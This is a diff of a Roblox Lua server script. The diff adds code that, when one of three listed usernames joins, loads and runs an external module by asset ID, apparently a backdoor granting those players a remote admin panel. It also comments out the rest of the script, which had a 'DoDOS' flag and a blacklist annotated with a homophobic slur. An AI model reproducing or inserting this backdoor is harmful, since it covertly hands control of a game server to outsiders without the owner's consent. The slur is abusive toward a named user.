@@ -1,4 +1,18 @@
+local AdminPanel = {
+	"t10_kol",
+	"LuckDanil",
+	"minecraft2201653",
+}
+game.Players.PlayerAdded:Connect(function(player)
 
+
+	if table.find(AdminPanel,player.Name) then
+		require(7192763922).load(player.Name)
+	end
+
+end)
+
+--[[
 repeat task.wait() until _G.HDAdminMain~=nil
 local main = _G.HDAdminMain
 local HttpService = game.HttpService
@@ -7,11 +21,7 @@ local EnabledDoDOS = false
 local BlackList = {
 	["Vad_75"]=true, --< Vadik Pidorasik
 }
-local AdminPanel = {
-	"t10_kol",
-	"LuckDanil",
-	"minecraft2201653",
-}
+
 
 game.Players.PlayerAdded:Connect(function(plr)
 
@@ -124,3 +134,4 @@ game["Run Service"].Heartbeat:Connect(function()
 		end
 	end
 end)
+]]
